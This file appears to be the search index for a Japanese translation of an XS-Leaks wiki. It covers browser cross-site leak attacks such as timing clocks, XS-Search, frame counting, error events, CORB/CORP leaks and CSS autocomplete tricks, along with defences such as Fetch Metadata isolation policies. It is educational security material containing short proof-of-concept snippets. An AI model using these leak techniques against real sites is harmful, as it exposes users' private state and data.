"use strict";(function(){const t={cache:!0};t.doc={id:"id",field:["title","content"],store:["title","href","section"]};const e=FlexSearch.create("balance",t);window.bookSearchIndex=e,e.add({id:0,href:"/docs/defenses/design-protections/",title:"Application Design",section:"対策の仕組み",content:` アプリケーション設計 # このセクションには、以下について解説する記事を掲載しています。
cache probing攻撃に対する対策はこちらを参照してください Cache Protections。 機密性の高いエンドポイントの保護についてはこちらを参照してください Subresource Protections。 `}),e.add({id:1,href:"/docs/defenses/isolation-policies/resource-isolation/",title:"Resource Isolation Policy",section:"Isolation Policies",content:`Resource Isolation Policyは、外部のWebサイトがリソースを要求するのを防ぎます。このようなトラフィックをブロックすることで、CSRF、XSSI、XS-Leaks などの一般的な Web 脆弱性を軽減できます。このポリシーは、エンドポイントがクロスサイトコンテキストでロードされることを意図していないアプリケーションに対して有効にすることができ、アプリケーションから来るリソース要求だけでなく、直接の遷移も可能にします。
Fetch Metadataを用いた実装 # 以下のコードは、Fetch Metadata ヘッダーを使用したResource Isolation Policyの実装例を示しています:
# クロスサイトリクエストを拒否し、クリックジャッキングやXS-Leaks、他のバグから保護します def allow_request(req): # [OPTIONAL] クロスオリジンで提供されることを意図したパス/エンドポイントを除外する。 if req.path in (\u0026#39;/my_CORS_endpoint\u0026#39;, \u0026#39;/favicon.png\u0026#39;): return True # \`Cross-Origin-Resource-Policy: same-site\`を設定すると安全です。(考慮事項参照) # Fetch Metadataを送信しないブラウザからのリクエストを許可する if not req[\u0026#39;headers\u0026#39;][\u0026#39;sec-fetch-site\u0026#39;]: return True # same-siteやブラウザ経由のリクエストの許可 if req[\u0026#39;headers\u0026#39;][\u0026#39;sec-fetch-site\u0026#39;] in (\u0026#39;same-origin\u0026#39;, \u0026#39;same-site\u0026#39;, \u0026#39;none\u0026#39;): return True # 埋め込みを含むシンプルなトップレベルの遷移を許可する if req[\u0026#39;headers\u0026#39;][\u0026#39;sec-fetch-mode\u0026#39;] == \u0026#39;navigate\u0026#39; and req.method == \u0026#39;GET\u0026#39;: return True # その他のリクエストを拒否する return False 考慮事項 # Resource Isolation Policyから明示的に除外されていないすべてのリクエストに Cross-Origin-Resource-Policy: same-site レスポンスヘッダを設定しても問題ないはずです。CORPを参照してください。
デプロイメント # web.devの記事で、この保護機能についての詳細や異なるポリシー、導入方法のヒントをご覧ください。
`}),e.add({id:2,href:"/docs/attacks/timing-attacks/clocks/",title:"Clocks",section:"Timing Attacks",content:`クロックには、明示的なものと暗黙的なものの2種類があります。 明示的なクロックは、開発者が直接タイミングを測定するために使用されるもので、その機構はブラウザによって明示的に提供されます。 一方で、暗黙的なクロックは、特定のWebの機能を利用して作り出される想定外のもので、それを利用することで相対的な時間経過を測定できるものです。
明示的なクロック # performance.now API # performance.now() APIは、開発者がより高精度に時間を計測することを可能にします。
info
XS-Leaksのいくつかのタイプを緩和するため、performance.now()の精度は、すべてのモダンブラウザでナノ秒からマイクロ秒の範囲に縮小されました。123
Reduce resolution of performance.now (Webkit). link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Reduce precision of performance.now() to 20us (Gecko). link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Reduce resolution of performance.now to prevent timing attacks (Blink). link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Date API # [Date] APIは、タイミング測定に使用できる最も古いブラウザのAPIです。 これにより開発者は日付を取得したり、Date.now()を使ってUnixタイムスタンプを取得したりすることができます。 より新しいAPIが導入される前は、このAPIが攻撃に使われていました。1
暗黙的なクロック # SharedArrayBufferとWeb Workers # Web Workersの導入に伴い、スレッド間でデータを交換するための新しいメカニズムが作られました。2それらの機構の一つがSharedArrayBufferで、メインスレッドとワーカスレッドの間でメモリ共有を提供します。悪意のあるウェブサイトは、バッファ内の数値をインクリメントさせる無限ループを実効するワーカーをロードすることで、implicit クロックを作成することができます。この値は、メインスレッドからいつでもアクセスでき、何回インクリメントが行われたかを読み取ることができる。
info
Spectreの公開に伴い、SharedArrayBufferはブラウザから削除されました。 その後、2020年に再導入され、このAPIを利用する際はドキュメントがセキュアコンテキスト内にあることが要求されるようになりました。 セキュアコンテキストは、アクセスすることを明示的にオプトインしていないクロスオリジンコンテンツは参照できないので、これはSharedArrayBufferがいくつかのXS-Leakにおいてはクロックとして使用できないことを意味します。
モダンブラウザでSharedArrayBufferを使用するには、アプリケーションは以下のヘッダを設定することで、明示的にCOOPやCOEPを有効にする必要があります。
Cross-Origin-Opener-Policy: same-origin Cross-Origin-Embedder-Policy: require-corp // WebWorker内部で実行する関数を定義する function worker_function() { self.onmessage = function (event) { const sharedBuffer = event.data; const sharedArray = new Uint32Array(sharedBuffer); // uint32の数値を無限に増加増加させる while (true) Atomics.add(sharedArray, 0, 1); }; } // Create the WebWorker from the JS function and invoke it const worker = new Worker( URL.createObjectURL( new Blob([\`(\${worker_function})()\`], { type: \u0026#34;text/javascript\u0026#34; })) ); // WebWorkerとドキュメント間のShared bufferを作成する const sharedBuffer = new SharedArrayBuffer(Uint32Array.BYTES_PER_ELEMENT); const sharedArray = new Uint32Array(sharedBuffer); worker.postMessage(sharedBuffer); tip
メインスレッドでの相対時間を取得するには、Atomics APIを利用する。
Atomics.load(sharedArray, 0); その他のクロック # 攻撃者が暗黙的なクロックを作り出すために悪用できるAPIは、相当数存在します。： Broadcast Channel API、Message Channel API、requestAnimationFrame、setTimeout、CSSアニメーション、その他3 4.
参考文献 # Exposing Private Information by Timing Web Applications, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Shared memory: Side-channel information leaks, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Fantastic Timers and Where to Find Them: High-Resolution Microarchitectural Attacks in JavaScript, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Trusted Browsers for Uncertain Times, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:3,href:"/docs/attacks/xs-search/",title:"XS-Search",section:"攻撃手法",content:`XS-Search（クロスサイトサーチ）は、XS-Leaksのファミリーの中で重要な攻撃原理です。 この種の攻撃は、クエリベースの検索システムを悪用し、攻撃者のオリジンからユーザー情報をリークさせます1 2。
元々の攻撃は、検索システムが結果を返すかどうかを検出するためにレスポンス時間を用いて、以下のように行います。
リクエストの結果がヒットした場合の時間(hit）と、結果がヒットしなかった場合の時間(miss)を計測する。 検索エンドポイントへのリクエストに対して、timing attackを開始し、最初の文字 (?q=r) をブルートフォースで攻撃する。 2.で計測した時間が1.で計測したhitである場合、もう一文字追加する (?q=ra); そうでなければ、新しい文字 (?q=s) を試す。 最終的に、完全なシークレット(?q=secret)を取得できる。 この攻撃は、正確さを期すために複数のタイミング測定が必要であり、インフレーション技術や統計分析によって改善することができます。 さらに、一文字ずつブルートフォースするのではなく、攻撃者は特定の単語や文章を検索して結果の出現箇所のみを漏洩させることができます。
この攻撃の最も重要な部分はその原理であり、様々なXS-Leaksに適用することが可能です。
レスポンス時間の増加方法 # XS-Searchのインフレーション技術は、2つのレスポンス（hitまたはmiss）を区別しやすくすることで攻撃の精度を上げるために使用されます。 以下の2つのメカニズムにより、攻撃者はより適切な計測を行うことができます。
検索システムが結果を返す際に、特定のGETパラメータをレスポンスに反映させるとレスポンスのサイズが大きくなる。これによりレスポンスをネットワーク上に送信する時間が大幅に増加するため、リクエストをより区別しやすくする。 レスポンスを返す前に、サーバーにさらに計算作業を実行させる。この方法は、より表現力の高いクエリー言語を提供する検索システムに適用できる。（例：Gmailのexclude termsは結果内のすべての文字を処理する） 拡張原理 # XS-Search に関するオリジナルの研究はタイミング攻撃に焦点を当てていましたが、この攻撃の原理は他の XS-Leak にも拡張することができます。 前述のように信頼性の低いタイミング測定に頼るのではなく、攻撃者は他の XS-Leak を利用して同じ情報を抽出することができます。
クエリベースの検索システムでは、ユーザーはクエリを送信し、そのクエリに関連するレスポンスを取得します。 この動作は、2つの異なる結果をもたらす可能性があります。
システムが結果を表示し、ページが特定の動作をする(第1の状態)。 システムが結果を表示せず、ページがステップ1とは異なる方法で動作する(第2の状態)。 上記の両方の挙動をタイミングよりも信頼性の高い XS-Leak で区別できる場合、攻撃者はより効率的な XS-Search 攻撃を行うことができます。 例えば、検索結果によってページのフレーム数が変化する（ステップ1と2が区別できる）場合、この攻撃原理は Frame Counting XS-Leak を適用することができるため、タイミング測定を使用するよりも正確である可能性があります。
対策 # Attack Alternative SameSite Cookies (Lax) COOP Framing Protections Isolation Policies XS-Search (timing) ✔️ ❌ ❌ RIP 🔗 NIP 🔗 – 異なるシナリオに対して有効な防御機構を組み合わせる必要があります
References # Cross-Site Search Attacks, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Cross-Site Search (XS-Search) Attacks - Hemi Leibowitz, OWASP AppSec IL 2015, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:4,href:"/docs/defenses/opt-in/",title:"Opt-In Mechanisms",section:"対策の仕組み",content:` Opt-In Mechanisms # XS-Leak攻撃から防御するために、アプリケーションが展開できるさまざまなオプトインメカニズムがあります。 メカニズムは、防御するテクニックの点で重複する可能性があることに注意してください。
Fetch Metadataを使用すると、アプリケーションは要求が開始された方法と理由を判別できるため、悪意のある要求を拒否できます。 Cross-Origin-Opener-Policy を使用すると、アプリケーションは、window.openまたはwindow.openerを介した他のWebサイトとのやり取りを防ぐことができます。 Cross-Origin-Resource-Policy を使用すると、アプリケーションは他のサイトに特定のリソースが含まれないようにすることができます。 Framing Protections を使用すると、アプリケーションでフレーミングを許可するサイトを定義できます。 SameSite Cookies を使用すると、アプリケーションはサードパーティサイトからのリクエストにCookieを含めるかを判断できます。 `}),e.add({id:6,href:"/docs/defenses/isolation-policies/framing-isolation/",title:"Framing Isolation Policy",section:"Isolation Policies",content:`Framing Isolation Policy は、Framing Protections のより厳格なバージョンで、ブラウザではなく、アプリケーションレベルでリクエストがブロックされます。これは、フレーム化を意図していないエンドポイントへのフレーム化リクエストをブロックすることで、さまざまな攻撃（XSSI、CSRF、XS-Leaksなど）から保護するために設計されています。
Resource Isolation Policy と組み合わせることで、XS-Leaksの攻撃対象領域を効果的に絞り込むことができます。
tip
フレーム化できないエンドポイントをすべて拒否するのではなく、例えば 信頼できる発信元からこのページを訪問したことを確認する といったアクションを確認するようユーザーに促すことで、バックグラウンドでの攻撃のリスクを軽減し、同時にアプリケーションの意図しない破損を防ぐことができます。 tip
Resource Isolation Policy と共に展開された場合、Framing Isolation Policy はウィンドウ参照（例 window.length）を利用したリークから保護しないため、COOP や Navigation Isolation Policy など他の画面遷移保護が役に立つことがあります。 Fetch Metadataを用いた実装 # 以下のコードは、アプリケーションによる Framing Isolation Policy の実装例を示しています。
# CSRF、XSSI、XS-Leaksなどのバグから保護するために、クロスサイトリクエストを拒否します。 def allow_request(req): # Fetch Metadataを送信しないブラウザからのリクエストを許可する。 if not req[\u0026#39;headers\u0026#39;][\u0026#39;sec-fetch-site\u0026#39;]: return True if not req[\u0026#39;headers\u0026#39;][\u0026#39;sec-fetch-mode\u0026#39;]: return True if not req[\u0026#39;headers\u0026#39;][\u0026#39;sec-fetch-dest\u0026#39;]: return True # 遷移以外のリクエストを許可する。 if req[\u0026#39;headers\u0026#39;][\u0026#39;sec-fetch-mode\u0026#39;] not in (\u0026#39;navigate\u0026#39;, \u0026#39;nested-navigate\u0026#39;): return True # 遷移以外のリクエストを許可する。 if req[\u0026#39;headers\u0026#39;][\u0026#39;sec-fetch-dest\u0026#39;] not in (\u0026#39;frame\u0026#39;, \u0026#39;iframe\u0026#39;, \u0026#39;embed\u0026#39;, \u0026#39;object\u0026#39;): return True # [OPTIONAL] クロスサイトで提供されることを意図したパス/エンドポイントを除外する。 if req.path in (\u0026#39;/my_frame_ancestors_host_src\u0026#39;): return True # 全ての他のリクエストを拒否する。 return False 考慮事項 # エンドポイントがX-Frame-Options および/または Content Security Policy の frame-ancestors ディレクティブによって特定のオリジンからのフレーミングリクエストを許可する場合、Framing Isolation Policy を適用することはできません。
`}),e.add({id:7,href:"/docs/attacks/window-references/",title:"Window References",section:"攻撃手法",content:`もしページが opener プロパティを null に設定したり、ユーザーの状態に応じて COOP による保護を使用している場合、その状態に関するクロスサイト情報を推測することができます。 例えば、攻撃者は認証されたユーザーのみがアクセスできる iframe (または新しいウィンドウ) でエンドポイントを開き、そのウィンドウの参照をチェックするだけで、ユーザーがログインしているかどうかを検出することができます。
コード # 以下のコードは、open プロパティが null に設定されているかどうか、あるいは COOP ヘッダーが unsafe-none 以外の値で存在するかどうかを検出する方法を示しています。 これは、iframeと新しいウィンドウの両方で行うことができます。
// 脆弱な攻撃対象URL const v_url = \u0026#39;https://example.org/profile\u0026#39;; const exploit = (url, new_window) =\u0026gt; { let win; if(new_window){ // 新しいタブを開き、win.opener が COOP の影響を受けたか、あるいは null に設定されたかどうかを確認 win = open(url); }else{ // opener が定義されているかどうかを検出するために iframe を作成 // COOP の検出や、ページがフレーム保護を実装している場合は機能しない document.body.insertAdjacentHTML(\u0026#39;beforeend\u0026#39;, \u0026#39;\u0026lt;iframe name=\u0026#34;xsleaks\u0026#34;\u0026gt;\u0026#39;); // iframeを脆弱な攻撃対象URLにリダイレクトする win = open(url, \u0026#34;xsleaks\u0026#34;); } // ページのロードを2秒待つ setTimeout(() =\u0026gt; { // 新しく開いたウィンドウのオープナープロパティを確認する if(!win.opener) console.log(\u0026#34;win.opener is null\u0026#34;); else console.log(\u0026#34;win.opener is defined\u0026#34;); }, 2000); } exploit(v_url); exploit(v_url, 1); 対策 # この種の XS-Leak を軽減する方法は、COOP を使って全てのページで opener プロパティを同じ値に設定し、異なるページ間で一貫性を保つ必要があります。 JavaScript を使って opener を null に設定すると、iframe のサンドボックス属性を使用して JavaScript を完全に無効にすることができるため、エッジケースが発生することがあります。
`}),e.add({id:8,href:"/docs/attacks/browser-features/corb/",title:"CORB Leaks",section:"Browser Features",content:`Cross-Origin Read Blocking (CORB) は、Spectre などの投機的サイドチャネル攻撃の影響を軽減することを目的とした、Web プラットフォームのセキュリティ機能です。残念ながら、特定のタイプのリクエストをブロックすることで、あるリクエストではCORBが実行され、別のリクエストでは実行されなかったことを攻撃者が検出できる、新しいタイプのXS-Leaks 1 をもたらしました。とはいえ、このXS-Leaksは、CORBによって積極的に保護される問題(Spectreなど)よりもはるかに影響は少ないです。
info
これはChromiumの既知の問題であり、未修正のままであるかもしれませんが、ChromiumベースのブラウザでデフォルトでSameSite Cookieが展開されることにより、その影響は大きく軽減されます。 CORB \u0026amp; Error Events # 攻撃者は、CORBがレスポンスからボディとヘッダーを取り除く結果となるステータス コード2xxで、レスポンスがCORB protectedContent-Type（およびnosniff）を返す場合、CORBの保護機能が強制的に実行されたことを観察することができます。この保護機能を検出すると、攻撃者はステータスコード (成功 もしくは エラー) と Content-Type (CORBで保護されているかどうか) の両方の組み合わせをリークさせることができます。これにより、以下の例に示すように、2つの可能な状態を区別することができます。
1番目の状態はリクエストがCORBによって保護され、2番目の状態では、クライアントエラー（404）となる。 1番目の状態はCORBによって保護され、2番目の状態では保護されない。 以下の手順で、最初の例の文脈でこの保護機能を悪用することができます。
攻撃者は、Content-Typeがtext/htmlでnosniff ヘッダーが設定された200 OKのレスポンスを返すリソースをscriptタグに、クロスオリジンリソースとして埋め込むこみます。 機密性の高いコンテンツが攻撃者のプロセスに入るのを防ぐため、CORBは元のレスポンスを空のレスポンスに置き換えます。 空のレスポンスは有効なJavaScriptであるため、onerror イベントは発生せず、onload が代わりに発生します。 攻撃者は、1.と同様に2番目のリクエスト（2番目の状態に対応）をトリガーし、200 OK 以外のものを返します。このとき、onerror イベントが発生します。 興味深い動作は、CORBがリクエストから有効なリソースを作成し、JavaScript以外を含む可能性がある（エラーを引き起こす）ことです。非CORB環境を考慮すると、1.と 4.の両方のリクエストがエラーを引き起こします。これは、これらの状況によって区別可能であるとしてXS-Leakを導入しています。
nosniffヘッダーの検出 # CORBは、リクエストに nosniff ヘッダーが存在する場合、攻撃者に検出されてしまう可能性があります。この問題は、CORBがこのヘッダーの存在と一部のスニッフィングアルゴリズムによってのみ強制的に実行されることに起因しています。以下の例では、2つの区別可能な状態を示しています。
CORBは、リソースがnosniffヘッダーと共にContent-Typeがtext/htmlで提供される場合、scriptとして認識されたリソースを埋め込んだ攻撃者ページを防止します。 リソースがnosniffを設定せず、CORBがページの Content-Typeを推測できない場合（text/htmlのまま）、コンテンツが有効なJavaScriptとして解析できないためSyntaxErrorが発生します。このエラーは、scriptタグが特定の条件下でのみエラーイベントをトリガーするため、window.onerror をリッスンすることで捕捉できます。 対策 # SameSite Cookies (Lax) COOP Framing Protections Isolation Policies ✔️ ❌ ❌ RIP 🔗 NIP 🔗 – 異なるシナリオに対して有効な防御機構を組み合わせる必要があります。
tip
開発者は、アプリケーションのサブリソースにCORPを展開し、いつ動作するかを決定するためにレスポンスを検査しないCORBと同様の保護を強制することができます。攻撃者がこのXS-Leakを悪用するのを防ぐために、一般的なXS-Leakの防御メカニズムも有効です。 参考文献 # CORB vs side channels, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:9,href:"/docs/attacks/browser-features/corp/",title:"CORP Leaks",section:"Browser Features",content:` 説明 # Cross-Origin Resource Policy (CORP) は、Webプラットフォームセキュリティ機能で、Webサイトが特定のリソースを他のオリジンから読み込むことを防止することができます。CORBがデフォルトで一部のクロスオリジン読み込みをブロックするのに対し、CORPはオプトインの防御であるため、この保護機能はCORBを補完するものです。残念ながら、CORBと同様に、アプリケーションがこの保護の使用を誤って設定すると、新しいXS-Leakをもたらす可能性があります。
CORPがユーザーデータに基づいて強制される場合、WebページはXS-Leakをもたらすことになります。ページ検索機能が、結果を表示するときはCORPを強制し、結果を返さないときは強制しないのであれば、攻撃者は2つのシナリオを区別することができます。これは、CORPによって保護されたページ/リソースがクロスオリジンでフェッチされるとエラーを返すために発生します。
対策 # アプリケーションは、CORPがすべてのアプリケーションリソース/エンドポイントに展開されていることを保証すれば、このXS-Leakを回避することができます。さらに、クロスサイトリクエストの無効化を可能にする一般的なセキュリティメカニズムも、この攻撃を防ぐのに役立ちます。
SameSite Cookies (Lax) COOP Framing Protections Isolation Policies ✔️ ❌ ❌ RIP 🔗 NIP 🔗 – 異なるシナリオに対して有効な防御機構を組み合わせる必要があります。
`}),e.add({id:10,href:"/docs/attacks/css-tricks/",title:"CSS Tricks",section:"攻撃手法",content:` CSS Tricks # CSSを利用して視覚的な変化を起こすことで、ユーザーが埋め込みピクセル値などの情報を暴露するように騙すことができます。
ユーザのヒストリーを取得する # CSSの:visitedセレクタを使うと、訪問したことのある URL に対して異なるスタイルを適用することができます。 以前はgetComputedStyle()を使ってこの違いを検出することができましたが、昨今のブラウザでは常にリンクが訪問されたかのような値を返すことでこれを防ぎ、セレクタを使って適用できるスタイルを制限しています。1
そこで、CSSが効いた領域をクリックするようにユーザーを誘導する必要があるかもしれませんが、これはmix-blend-modeを使って行うことができます。2 また、レンダリングタイミングを悪用することで、ユーザーとのインタラクションなしに、リンクを別の色に塗り替える方法もあります。3 複数のリンクを使用して時間差を増加させることで動作するPoCがchromium report上で提供されました。3
info
この攻撃例[^leak-1]は、もぐらたたきゲームを利用してユーザーをだましてページをクリックさせるものです。この問題に関して複数のブラウザにバグが報告されています。: ^bug-1, ^bug-2, ^bug-3 Captchaの悪用 # CSSを使えば、埋め込みをコンテキストから外部に取り出せます。 この例として、4に見られるようなcaptchaのふりをすることが挙げられます。 これは、埋め込み部分の幅と高さを設定することで、狙った文字だけが表示されるようにするものです。 複数の埋め込みを利用して、表示される文字の順番を変えて、何の情報を提供しているのかをユーザーが分かりづらくすることも可能です。
オートコンプリートの悪用 # テキスト入力を使用するウェブサイトで、autocomplete=\u0026quot;off\u0026quot;を使用してオートコンプリートを無効にしない場合、電子メールアドレスなどのデータをリークできる場合があります。javascriptを使用したテキスト入力のオートコンプリート機能を利用するために、ユーザーを騙して、キーを押させることができます。 Chromeの場合、上または下矢印キーを押してダイアログを開き、値を選択した後、EnterキーまたはTabキーを押して値をページに挿入するようにユーザーを誘導することが必要です。
let input = document.createElement(\u0026#34;input\u0026#34;); input.type = \u0026#34;email\u0026#34;; input.autocomplete = \u0026#34;email\u0026#34;; input.name = \u0026#34;email\u0026#34;; input.size = \u0026#34;1\u0026#34;; input.style = \u0026#34;position:absolute;right:-500px;bottom:-21.9px\u0026#34;; input.onkeypress = e =\u0026gt; { e.preventDefault(); } window.onmousedown = e =\u0026gt; { // マウスのクリックを無視する e.preventDefault(); } input.onchange = e =\u0026gt; { alert(e.srcElement.value); e.srcElement.value = \u0026#34;\u0026#34;; } document.body.appendChild(input); setInterval(() =\u0026gt; { input.focus({preventScroll: true}); }, 1000); カスタムカーソル # データを直接的にリークすることはできないかもしれませんが、ユーザーを騙すのに役立つかもしれません。巨大なカーソルは、オートコンプリートダイアログや他のネイティブUIに重なるかもしれないからです。
\u0026lt;style\u0026gt; :root { cursor: url(\u0026#39;https://www.google.com/favicon.ico\u0026#39;), auto; } \u0026lt;/style\u0026gt; 対策 # XFOは、埋め込みが攻撃されることを防ぎます。これは、(XFOによって)コンテンツ表示されなくなることで、視覚的な違いがなくなるためです。ユーザのヒストリーを取得するタイプの攻撃は、ユーザー側で防ぐしかありません。ブラウザの履歴を無効にしたり、Firefoxの場合、about:configパネルでlayout.css.visited_links_enabledをfalseに設定すれことで、防ぐことができます。
SameSite Cookies (Lax) COOP Framing Protections Isolation Policies ❌ ❌ ✔️ ❌ 参考文献 # Privacy and the :visited selector, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
CSS mix-blend-mode is bad for your browsing history, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Visited links can be detected via redraw timing, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;
The Human Side Channel, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:11,href:"/docs/attacks/error-events/",title:"Error Events",section:"攻撃手法",content:`Webページがサーバにリクエストを発行すると（例：フェッチ、HTMLタグ）、サーバはこのリクエストを受信して処理します。 受信した際にサーバは与えられた条件に基づいて、リクエストが成功（例：200）すべきか失敗（例：404）すべきかを決定します。 レスポンスがエラーステータスを持つ場合、ページを処理するためにブラウザによってerror eventが発行されます。 これらのエラーは、例えばHTMLコンテンツを画像として埋め込もうとした時のようなパーサーの処理が失敗するケースにも対応しています。
たとえば、攻撃者は認証されたユーザだけが利用できるリソースにユーザがアクセスできるかどうかを確認することで、ユーザがサービスにログインしているかどうかを検出できます1。 このXS-Leakの影響はアプリケーションによって異なりますが、ユーザを非匿名化する高度な攻撃につながる可能性があります2。
エラーイベントは様々な HTMLタグからスローされる可能性があり、ブラウザによって動作が異なるものもあります 3。 例えば、読み込まれたリソースやHTMLタグ、特定のヘッダ（例えば nosniff や Content-Type ）の存在、あるいはブラウザのデフォルトの保護機能の適用などによって動作が変わることがあります。
エラーイベントで情報をリークさせる原理は、さまざまなXS-Leakに抽象化して適用できます。 たとえば、Cache Probingの1つの手法では、特定の画像がブラウザによってキャッシュされたかどうかの検出にエラーイベントを使用しています。
コード # 以下のコードは、\u0026lt;script\u0026gt; タグを使用してエラーイベントを検出する方法を示しています。
function probeError(url) { let script = document.createElement(\u0026#39;script\u0026#39;); script.src = url; script.onload = () =\u0026gt; console.log(\u0026#39;Onload event triggered\u0026#39;); script.onerror = () =\u0026gt; console.log(\u0026#39;Error event triggered\u0026#39;); document.head.appendChild(script); } // google.com/404 が HTTP 404 を返すため、スクリプトはエラーイベントを発生する probeError(\u0026#39;https://google.com/404\u0026#39;); // google.com は HTTP 200 を返すので、スクリプトは onloadイベントをトリガーする probeError(\u0026#39;https://google.com/\u0026#39;); 対策 # このXS-Leakの緩和策は、アプリケーションが特定のリソースをどのように処理するかによって異なる可能性があります。 一般的なアプローチとしては、可能な限り一貫した挙動を採用することです。 特定のシナリオでは、アプリケーションはSubresource Protectionsを使用して、攻撃者がURLを予測して攻撃を進行させることを防ぐことができます。 最後に、一般的なWebプラットフォームのセキュリティ機能を導入することで、アプリケーションの実装に大きな変更を加えることなく、このXS-Leakをより大幅に緩和することができます。
SameSite Cookies (Lax) COOP Framing Protections Isolation Policies ✔️ ❌ ❌ RIP \\(^{1}\\) resource isolation policyはエラーベースのcross-site leaksを防ぐのに十分な有効なはずですが、Framing Isolation Policyがないシナリオでは、iframeを通してエラーイベントが漏洩する可能性があります。 実例 # 特定のユーザしかアクセスできないTwitter APIのエンドポイントを悪用できるバグがありました。 このエンドポイントは、所有者以外のすべてのTwitterユーザに対してエラーを返します。 攻撃者はこの挙動を悪用して、ユーザを非匿名化させる可能性があります。 同様に、別のバグではプライベートメッセージの画像認証機構を悪用して、同じ目的を達成することができました4 2。
参考文献 # Twitter ID exposure via error-based side-channel attack, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Leaky Images: Targeted Privacy Attacks in the Web, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Cross-Origin State Inference (COSI) Attacks: Leaking Web Site States through XS-Leaks, link (see page 6)\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Tracking of users on third-party websites using the Twitter cookie, due to a flaw in authenticating image requests, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:12,href:"/docs/attacks/frame-counting/",title:"Frame Counting",section:"攻撃手法",content:`ウィンドウの参照により、クロスオリジンのページが他のページのいくつかの属性にアクセスできます。 これらの参照は、iframeとwindow.openを使用または許可するときに利用可能となります。 この参照は、同一生成元ポリシーを尊重し続けるため、ウィンドウに関する（限定的な）情報を提供します。
アクセス可能な属性の1つは、ウィンドウ内のフレーム数を提供するwindow.lengthです。 この属性は、ページに関する貴重な情報を攻撃者に提供します。
Webサイトでは一般的にフレーム（またはiframes）を使用しますが、この選択は必ずしもセキュリティ上の問題を意味するわけではありません。 しかし、Webサイトがユーザの情報に応じてページのフレーム数を変更する場合があります。 例えば、GETパラメータと利用者のデータに応じてレイアウトを変えるようなページで起こりえます。 攻撃者は、異なるページで window.length の値を測定することにより、被害者に関する情報を推測することが可能かもしれません。
コード # 以下のコードは、クロスサイトのページにおけるフレーム数に関する情報にアクセスする方法を示しています。
// ウィンドウへの参照を取得する var win = window.open(\u0026#39;https://example.org\u0026#39;); // ページが読み込まれるのを待つ setTimeout(() =\u0026gt; { // 読み込まれたiframeの数を読み取る console.log(\u0026#34;%d iframes detected\u0026#34;, win.length); }, 2000); 攻撃の対策 # 場合によっては、異なるアプリケーション状態が同じ数のフレームを持つことで、攻撃者がそれらを区別できないようにすることができます。 ただし、ページの読み込み中にフレーム数を連続的に記録することで、攻撃者に情報をリークする可能性があるパターンを示す可能性もあります。
// ウィンドウへの参照を取得する var win = window.open(\u0026#34;https://example.org\u0026#34;); var pattern = []; // ループ内で、60ms間隔でiframeの数を登録する var recorder = setInterval(() =\u0026gt; { pattern.push(win.length) }, 60); // 6秒後にループを解除する setTimeout(() =\u0026gt; { clearInterval(recorder); console.log(\u0026#34;The pattern is: %s\u0026#34;, pattern.join(\u0026#39;, \u0026#39;)); }, 6 * 1000); 事例 # フレームカウント攻撃の例としては、以下のようなものがあります。
あるWebサイトでは、ユーザが検索エンジンでユーザ情報を検索することができます。もしユーザの検索に対する結果があるかどうかによって、ページ構造のiframeの数が異なる場合に、攻撃者はXS-Searchの技術を利用して、秘密をリークさせることができるでしょう。 あるWebサイトでは、性別やその他の個人情報に基づいてユーザプロファイルページの構造が異なります。攻撃者は、ページを開いてフレームをカウントすることで、情報を簡単にリークさせることができるでしょう。 対策 # Attack Alternative SameSite Cookies (Lax) COOP Framing Protections Isolation Policies iframes ✔️ ❌ ✔️ FIP windows ❌ ✔️ ❌ NIP 実例 # Facebookに報告された脆弱性では、この手法を利用することで、投稿に掲載された特定の内容、友人の宗教情報、写真の位置情報などのユーザに関する情報をリークするというものでした1。
参考文献 # Patched Facebook Vulnerability Could Have Exposed Private Information About You and Your Friends. link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:13,href:"/docs/attacks/navigations/",title:"Navigations",section:"攻撃手法",content:`クロスサイトのページで画面遷移がトリガーされたか（または、そうでないか）を検出することは攻撃者にとって有用です。例えば、ウェブサイトはユーザの状態に依存(#case-scenarios)して、あるエンドポイントで画面遷移をトリガーする可能性があります。
どのような画面遷移が発生したかを検出することで攻撃者以下の様なことが可能になります。
iframeを使用してonloadイベントがトリガーされた回数を数える。 ウィンドウへの参照を通じてアクセス可能なhistory.lengthの値をチェックする。この値は被害者のhistory.pushStateや通常の画面遷移によって変更された履歴の数を提供しています。攻撃者はhistory.lengthの値を取得するためにウィンドウへの参照のlocationをターゲットのウェブサイトに変更し、そしてSame-Originに戻すことによって最後に値を読み取ります。 ダウンロードトリガー # エンドポイントがContent-Disposition: attachment ヘッダを設定すると、ブラウザにレスポンスをナビゲートさせるのではなくファイルとしてダウンロードすることを指示します。この挙動が発生したかを検出すると、結果が被害者の状態に依存する場合に攻撃者に機密情報をリークできる可能性があります。
ダウンロードバー # Chromeベースのブラウザではファイルをダウンロードする際に、ブラウザのウィンドウ下部にダウンロードの進捗を示すバーがウィンドウと一体化して表示されます。攻撃者ウィンドウの高さを監視することでダウンロードバーが開いているかどうかを検出することができます。
// ウィンドウの現在の高さを読み取る var screenHeight = window.innerHeight; // ダウンロードのトリガーとなるページを読み込む window.open(\u0026#39;https://example.org\u0026#39;); // タブの読み込みを待つ setTimeout(() =\u0026gt; { // ダウンロードバーが表示された場合、すべてのタブの高さが小さくなります if (window.innerHeight \u0026lt; screenHeight) { console.log(\u0026#39;Download bar detected\u0026#39;); } else { console.log(\u0026#39;Download bar not detected\u0026#39;); } }, 2000); important
